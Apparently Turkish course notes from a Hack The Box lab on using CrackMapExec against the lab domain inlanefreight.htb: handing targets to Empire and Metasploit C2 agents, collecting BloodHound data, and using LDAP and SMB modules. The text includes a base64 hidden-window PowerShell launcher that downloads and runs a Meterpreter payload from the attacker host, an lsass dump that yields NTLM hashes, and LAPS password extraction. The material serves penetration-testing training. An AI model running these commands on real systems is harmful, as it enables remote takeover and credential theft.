CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

```
git clone --recursive https://github.com/BC-SECURITY/Empire.git -q
cd Empire
sudo su
[!bash!]# curl -sSL https://install.python-poetry.org | python3 -
[!bash!]# poetry install
<SNIP>
```

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

```
[!bash!]# poetry run python empire.py server --username empireadmin --
password asdasd123

[*] Loading default config
[*] Loading bypasses from: /home/plaintext/Empire/empire/server/bypasses/
[*] Loading stagers from: /home/plaintext/Empire/empire/server/stagers/
[*] Loading modules from: /home/plaintext/Empire/empire/server/modules/
[*] Loading listeners from:
/home/plaintext/Empire/empire/server/listeners/
<SNIP>

```

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

```
cat ~/.cme/cme.conf
[CME]
workspace = default
last_used_db = smb
pwn3d_label = Pwn3d!
audit_mode =
[BloodHound]
bh_enabled = False
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = neo4j
[Empire]
api_host = 127.0.0.1
api_port = 1337
username = empireadmin
password = asdasd123
<SNIP>
```


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

```
[!bash!]# pwd; echo "";cat empire/client/config.yaml
/home/plaintext/Empire
suppress-self-cert-warning: true
auto-copy-stagers: true
servers:
 localhost:
 host: https://localhost
 port: 1337
 socketport: 5000
 username: empireadmin
 password: HackTheBoxCME!
 autoconnect: true
 other-server:
 host: https://localhost
 port: 1337
 socketport: 5000
 username: empireadmin
 password: asdasd123
 another-one:
 host: https://localhost
port: 1337
 socketport: 5000
 username: empireadmin
 password: HackTheBoxCME!
<SNIP>
```


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

```
[!bash!]# poetry run python empire.py client --config
empire/client/config.yaml

Loading config from empire/client/config.yaml
<SNIP>
==========================================================================
==============
[Empire] Post-Exploitation Framework
==========================================================================
==============
[Version] 4.8.1 BC Security Fork | [Web] https://github.com/BCSECURITY/Empire
==========================================================================
==============
[Starkiller] Multi-User GUI | [Web] https://github.com/BCSECURITY/Starkiller
==========================================================================
==============
[Documentation] | [Web] https://bc-security.gitbook.io/empire-wiki/
==========================================================================
==============
 _______ ___ ___ ______ __ ______ _______
 | ____| | \/ | | _ \ | | | _ \ | ____|
 | |__ | \ / | | |_) | | | | |_) | | |__
 | __| | |\/| | | ___/ | | | / | __|
 | |____ | | | | | | | | | |\ \----. | |____
 |_______| |__| |__| | _| |__| | _| `._____| |_______|
 409 modules currently loaded
 0 listeners currently active
 0 agents currently active
[*] Connected to localhost
(Empire) >
```

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

```
(Empire) > uselistener http
Author @harmj0y
Description Starts a http[s] listener (PowerShell or Python) that uses a
GET/POST
 approach.
Name HTTP[S]
<SNIP>
(Empire: uselistener/http) > set Host http://10.10.14.33
[*] Set Host to http://10.10.14.33
(Empire: uselistener/http) > set Port 8001
[*] Set Port to 8001
(Empire: uselistener/http) > execute
[+] Listener http successfully started

```


### Empire Setting up IP and Port

```
(Empire) > uselistener http
Author @harmj0y
Description Starts a http[s] listener (PowerShell or Python) that uses a
GET/POST
 approach.
Name HTTP[S]
<SNIP>
(Empire: uselistener/http) > set Host http://10.10.14.33
[*] Set Host to http://10.10.14.33
(Empire: uselistener/http) > set Port 8001
[*] Set Port to 8001
(Empire: uselistener/http) > execute
[+] Listener http successfully started
```

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M empire_exec -o LISTENER=http
EMPIRE_E... [+] Successfully
generated launcher for listener 'http'
SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
EMPIRE_E... 10.129.204.133 445 MS01 [+] Executed Empire Launcher
```


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

```
msfconsole
<SNIP>

msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp

msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.33
SRVHOST => 10.10.14.33

msf6 exploit(multi/script/web_delivery) > set SRVPORT 8443
SRVPORT => 8443

msf6 exploit(multi/script/web_delivery) > set target 2
target => 2

msf6 exploit(multi/script/web_delivery) > set payload
windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.14.33
LHOST => 10.10.14.33

msf6 exploit(multi/script/web_delivery) > set LPORT 8002
LPORT => 8002

msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) >
[*] Started reverse TCP handler on 10.10.14.33:8002
[*] Using URL: http://10.10.14.33:8443/2S1jAHS
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e
WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUw
BlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0
AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB5AE8ATwBqAD
0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYA
KABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARA
BlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABu
AHUAbABsACkAewAkAHkATwBPAGoALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAH
EAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsA
JAB5AE8ATwBqAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdA
AuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwBy
AGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAH
QAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIA
aQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwAzADoAOAA0ADQAMw
AvAE0AdgBYADYAQgBLAHUAagAvAHUAeQBjAEsAWQBaADAAeQB1AEkANQB1ADIATAAnACkAKQA7
AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAG
UAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8A
MQAwAC4AMQAwAC4AMQA0AC4AMwAzADoAOAA0ADQAMwAvAE0AdgBYADYAQgBLAHUAagAnACkAKQ
A7AA==

```

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

```
crackmapexec smb -M web_delivery --options

[*] web_delivery module options:
	 URL URL for the download cradle
	 PAYLOAD Payload architecture (choices: 64 or 32) Default: 64

```

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M web_delivery -o URL=http://10.10.14.33:8443/2S1jAHS

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WEB_DELI... 10.129.204.133 445 MS01 [+] Executed webdelivery launcher
```

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

```
cat ~/.cme/cme.conf
[CME]
workspace = default
last_used_db = smb
pwn3d_label = Pwn3d!
audit_mode =
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = asdasd123
<SNIP>
```

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

```
wget
https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -q
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 --put-file
SharpHound.exe SharpHound.exe
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!) SMB 10.129.203.121 445 DC01 [*] Copy
SharpHound.exe to SharpHound.exe SMB 10.129.203.121 445 DC01 [+] Created file
SharpHound.exe on \\C$\SharpHound.exe
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -x "C:\SharpHound.exe -c All && dir c:\*_BloodHound.zip"
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [+] Executed command
SMB 10.129.203.121 445 DC01 Volume in drive C has no label.
SMB 10.129.203.121 445 DC01 Volume Serial Number is B8B3-0D72
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 Directory of c:\
SMB 10.129.203.121 445 DC01
SMB 10.129.203.121 445 DC01 11/09/2022 09:54 AM 14,287 20221109095424_BloodHound.zip
SMB 10.129.203.121 445 DC01 1 File(s) 14,287 bytes
SMB 10.129.203.121 445 DC01 0 Dir(s) 8,828,305,408 bytes free
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 --get-file
20221109095424_BloodHound.zip bloodhound.zip
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [*] Copy 20221109095424_BloodHound.zip to bloodhound.zip
SMB 10.129.203.121 445 DC01 [+] File 20221109095424_BloodHound.zip was transferred to bloodhound.zip
```

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 Node [email protected] successfully set as owned in BloodHound
```

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M procdump

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
PROCDUMP 10.129.203.121 445 DC01 [*] Copy
/tmp/shared/procdump.exe to C:\Windows\Temp\
PROCDUMP 10.129.203.121 445 DC01 [+] Created file
procdump.exe on the \\C$\Windows\Temp\
PROCDUMP 10.129.203.121 445 DC01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
PROCDUMP 10.129.203.121 445 DC01 [*] Executing command
C:\Windows\Temp\procdump.exe -accepteula -ma 640
C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP 10.129.203.121 445 DC01 [+] Process lsass.exe
was successfully dumped
PROCDUMP 10.129.203.121 445 DC01 [*] Copy DC01-AMD64-
INLANEFREIGHT.dmp to host
PROCDUMP 10.129.203.121 445 DC01 [+] Dumpfile of
lsass.exe was transferred to /tmp/shared/DC01-AMD64-INLANEFREIGHT.dmp
PROCDUMP 10.129.203.121 445 DC01 [+] Deleted procdump
file on the C$ share
PROCDUMP 10.129.203.121 445 DC01 [+] Deleted lsass.dmp
file on the C$ share
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\svc_mssql:842bfb5892fc6cbe2af323e3199f0f18
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.203.121 445 DC01
\julio:500aad7ceb637a4255d101d50045310b31729ddb
PROCDUMP 10.129.203.121 445 DC01
127.0.0.1\julio:Password1
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
PROCDUMP 10.129.203.121 445 DC01
INLANEFREIGHT\svc_workstations:7247e8d4387e76996ff3f18a34316fdd
PROCDUMP 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
PROCDUMP 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
PROCDUMP 10.129.203.121 445 DC01 Node [email protected]
successfully set as owned in BloodHound
```


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

```
crackmapexec smb -M bh_owned --options

[*] bh_owned module options:
 URI URI for Neo4j database (default: 127.0.0.1)
 PORT Listening port for Neo4j database (default:
7687)
 USER Username for Neo4j database (default: 'neo4j')
 PASS Password for Neo4j database (default: 'neo4j')
```

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M bh_owned -o
PASS=asdasd123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)

SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
BH_OWNED 10.129.203.121 445 DC01 [+] Node
DC01.INLANEFREIGHT.HTB successfully set as owned in BloodHound
```

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

```
crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M getnetwork --options

[*] get-network module options:
 ALL Get DNS and IP (default: false)
 ONLY_HOSTS Get DNS only (no ip) (default: false)
```

```
crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M getnetwork -o ALL=true

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
GET-NETW... dc01.inlanefreight.htb 389 DC01 [*] Querying
zone for records
GET-NETW... dc01.inlanefreight.htb 389 DC01 [*] Using
System DNS to resolve unknown entries. Make sure resolving your target
domain works here or specify an IP as target host to use that server for
queries
GET-NETW... dc01.inlanefreight.htb 389 DC01 Found 4 records
GET-NETW... dc01.inlanefreight.htb 389 DC01 [+] Dumped 4
records to /home/plaintext/.cme/logs/inlanefreight.htb_network_2022-12-
13_065607.log

```

```
cat /home/plaintext/.cme/logs/inlanefreight.htb_network_2022-11-
10_101113.log
dc01.inlanefreight.htb 10.129.203.121
test.inlanefreight.htb 172.16.1.39
database01.inlanefreight.htb 172.16.1.29
```


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M laps --options

[*] laps module options:
 COMPUTER Computer name or wildcard ex: WIN-S10, WIN-* etc.
Default: *

```

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M
laps

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows 
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LAPS dc01.inlanefreight.htb 389 DC01 [*] Getting LAPS Passwords
LAPS dc01.inlanefreight.htb 389 DC01 Computer: MS01$
Password: 7*vp5Nc8Ph7uR&

```


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

```
crackmapexec ldap dc01.inlanefreight.htb -u robert -p 'Inlanefreight01!' -
M maq

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MAQ dc01.inlanefreight.htb 389 DC01 [*] Getting the MachineAccountQuota
MAQ dc01.inlanefreight.htb 389 DC01
MachineAccountQuota: 6

```


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

```
crackmapexec ldap -M daclread --options

[*] daclread module options:
 
	 Be carefull, this module cannot read the DACLS recursively. For
example, if an object has particular rights because it belongs to a group,
the module will not be able to see it directly, you have to check the
group rights manually.
	 TARGET The objects that we want to read or backup the
DACLs, sepcified by its SamAccountName
	 TARGET_DN The object that we want to read or backup the
DACL, specified by its DN (usefull to target the domain itself)
	 PRINCIPAL The trustee that we want to filter on
	 ACTION The action to realise on the DACL (read, backup)
	 ACE_TYPE The type of ACE to read (Allowed or Denied)
	 RIGHTS An interesting right to filter on ('FullControl',
'ResetPassword', 'WriteMembers', 'DCSync')
	 RIGHTS_GUID A right GUID that specify a particular rights to
filter on
```

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

```
crackmapexec ldap dc01.inlanefreight.htb -u '' -p '' -M daclread -o
TARGET=grace ACTION=read

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+] inlanefreight.htb\:
DACLREAD dc01.inlanefreight.htb 389 DC01 Be carefull,
this module cannot read the DACLS recursively.
DACLREAD dc01.inlanefreight.htb 389 DC01 Target
principal found in LDAP (CN=grace,CN=Users,DC=inlanefreight,DC=htb)
[*] ACE[1] info
[*] ACE Type : ACCESS_ALLOWED_OBJECT_ACE
[*] ACE flags : None
[*] Access mask : ReadProperty
[*] Flags : ACE_OBJECT_TYPE_PRESENT
[*] Object type (GUID) : User-Account-Restrictions (4c164200-
20c0-11d0-a768-00aa006e0529)
